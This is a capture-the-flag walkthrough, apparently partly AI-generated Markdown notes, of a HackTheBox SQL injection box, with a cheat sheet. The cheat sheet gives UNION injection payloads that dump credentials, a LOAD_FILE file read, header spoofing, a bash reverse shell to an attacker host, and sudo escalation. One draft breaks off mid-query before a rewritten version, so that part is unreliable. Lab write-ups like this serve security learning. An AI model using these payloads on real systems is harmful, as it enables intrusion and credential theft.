HTB: SQL Injection - IppSec Walkthrough

This box focuses on **SQL Union-based injection**, followed by **file read via SQL**, **SSH access**, and finally **command injection**. It also introduces advanced SQLMap defenses and how to analyze/filter them manually.

## Initial Recon

- Ran `nmap`, discovered an **nginx web server** hosting a PHP application.
- Launched **gobuster** to brute force directories in the background.
- Visited the site and explored functionality — particularly the **"Submit Player"** page.

## Manual SQL Injection Testing

- Used BurpSuite to intercept requests and modify **player name** fields.
- Tested SQL syntax manually to check for injection behavior.
- Noticed that app returned different content depending on the input.
- Began testing classic **UNION-based SQL injection** payloads.

## Union Injection & Information_Schema

- Referenced the **MySQL Information_Schema** documentation.
- Used `UNION SELECT` queries to extract:
  - **Database names**
  - **Table names**
  - **Column names**
- Leveraged `GROUP_CONCAT()` to return multiple rows in a single query.
- Used delimiters (`::`, `<br>`) to make results easier to parse in the browser.

## Flag Retrieval

- Extracted useful data by chaining:
  ```sql
  ' UNION SELECT 1, GROUP_CONCAT(schema_name) FROM information_schema.schemata --
```

and similar queries to dig into tables/columns.

- Eventually retrieved the **flag** from a backend table.
    
- Submitting the flag granted **SSH access** from our current IP.
    

## File Read via SQL Injection

- Used:
    
    ```sql
    LOAD_FILE('/var/www/html/index.php')
    ```
    
    to read source files.
    
- Located credentials for SSH in **config.php**.
    

## SSH Access

- Logged in using the extracted credentials.
    
- Investigated how the site **whitelisted IPs** — found that the app uses the `X-FORWARDED-FOR` header.
    

## Command Injection via Firewall.php

- Added custom `X-FORWARDED-FOR` headers to interact with `firewall.php`.
    
- Discovered a **command injection vulnerability** via BurpSuite.
    
- Switched from `sleep` timing payload to a **reverse shell**.
    

## Privilege Escalation

- Once inside, found that **www-data** user could run `sudo` with no password.
    
- Ran:
    
    ```bash
    sudo /bin/bash
    ```
    
    to get a root shell and capture the second flag.
    

## SQLMap Bypass Discussion

- `index.php` contained an **SQLMap Killer**:
    
    - Regex filters on request body to detect tools and block known bad keywords.
        
    - If a match occurred, the app returned a **static “Congratulations”** page (even for failed payloads).
        
- This made it seem like SQLMap wasn't working — all responses were identical.
    
- Explains why even modified strings (like changing "Congratulations" to "ongratulations") still returned the same thing:
    
    - The die() statement was triggered **before** the query was even run.
        
- Conclusion: no real **boolean injection** response difference to detect.
    



---

And here’s your matching command/reference markdown:

---

markdown
# HTB: SQL Injection - Commands & Techniques

## Web Recon

```bash
nmap -sC -sV -oA scan <target-ip>
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
````

## Manual SQL Injection Examples

```sql
' OR 1=1 -- 
' UNION SELECT 1, database() --
' UNION SELECT 1, GROUP_CONCAT(schema_name) FROM information_schema.schemata --
' UNION SELECT 1, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='targetdb' --
' UNION SELECT 1, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT 1, GROUP_CONCAT(username, 0x
```

Got you — here’s the **refined version** of your walkthrough notes for the **SQL Injection box**, rewritten in proper Markdown plaintext style for Obsidian. This includes everything you noted, with cleaned structure, clarified steps, and a second section at the end for a **command and concept cheat sheet**.

---

````markdown
# SQL Injection - HTB Walkthrough (IppSec)

This box is an excellent practice case for SQL Union Injections and how they lead to full compromise. It includes classic SQLi, information_schema enumeration, reverse shells, and a SQLMap bypass scenario.

## Recon

- Started with `nmap`, which showed an Nginx web server hosting a PHP site.
- Used `gobuster` in the background to enumerate directories while inspecting the site manually.
- The main focus was a "player submission" feature on the site.

## SQL Injection Discovery

- Inspected the player name field in BurpSuite and began testing with basic payloads.
- Manually confirmed SQL Injection by inputting queries that returned visible data.
- Identified a **Union-based SQL Injection** vulnerability.
  - Used `UNION SELECT` queries to pull from the `information_schema` database.
- Used `GROUP_CONCAT()` to extract multiple rows in one response:
  - Pulled database names.
  - Then pulled table names and column names.
- Customized output using delimiters to make data easier to parse visually.
- Queried and dumped sensitive table data, which included a flag.

## Gaining SSH Access

- After submitting the first flag, the server whitelisted the attacker's IP for SSH access.
- Tried using `LOAD_FILE()` to extract server files.
  - Found credentials in `/var/www/html/index.php` and `config.php`.

## Privilege Escalation

- SSH’ed into the box using the discovered credentials.
- Discovered that requests to `firewall.php` were influenced by the `X-FORWARDED-FOR` HTTP header.
  - By modifying this header, triggered **command injection**.
- Switched payload from `sleep` to a reverse shell using this injection.
- Escalated to root: `www-data` could run **sudo** for any command.
  - Used `sudo /bin/bash` to spawn a root shell.

## SQLMap Bypass Discussion

- The application had a custom **SQLMap Killer** regex-based filter in `index.php`.
  - This blocked typical SQLMap payloads based on known keywords.
- The filter matched common SQLMap words and forced a `die()` call, returning the same response each time.
- As a result, SQLMap was ineffective:
  - Even modifying strings like “Congratulations” to “ongratulations” didn’t help since the backend returned the same generic message.
  - This prevented SQLMap from identifying true/false conditions, so it couldn’t detect boolean injections.
- Explained that `--level` and `--risk` arguments in SQLMap change payload complexity, but weren’t enough to bypass the custom filter.

---

# 🔧 SQL Injection Command + Concept Cheat Sheet

## Nmap & Gobuster

```bash
nmap -sC -sV -oA scan <target-ip>
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
````

## SQL Injection (manual)

```sql
' UNION SELECT null, database() --
' UNION SELECT null, schema_name FROM information_schema.schemata --
' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema='<dbname>' --
' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='<table>' --
' UNION SELECT null, GROUP_CONCAT(column_name SEPARATOR ':') FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT null, GROUP_CONCAT(username, ':', password SEPARATOR ' | ') FROM users --
```

## Using LOAD_FILE() to Read Files

```sql
' UNION SELECT null, LOAD_FILE('/var/www/html/config.php') --
```

## Modifying HTTP Headers (BurpSuite)

```http
X-FORWARDED-FOR: 127.0.0.1
```

## Reverse Shell Payload (via Command Injection)

```bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```

## Privilege Escalation

```bash
sudo -l         # Check sudo permissions
sudo /bin/bash  # Run root shell if no password required
```

## SQLMap Tips

```bash
sqlmap -u "http://<target-ip>/vuln.php?id=1" --level=5 --risk=3 --random-agent
```

**Note:** If a WAF or filter causes all responses to be the same regardless of injection success, SQLMap won’t be able to infer injection points.

---

# Final Notes

- The SQLMap Killer filter blocked automated tools by responding identically to all payloads.
    
- Manual testing is critical when dealing with WAFs or custom filters.
    
- This box reinforces the importance of understanding SQL injection logic rather than blindly running tools.
    

```

---

Let me know if you want a template version of this for future web boxes or SQLi labs you work on, or if you'd like a visual breakdown of how union injection flows into privilege escalation.
```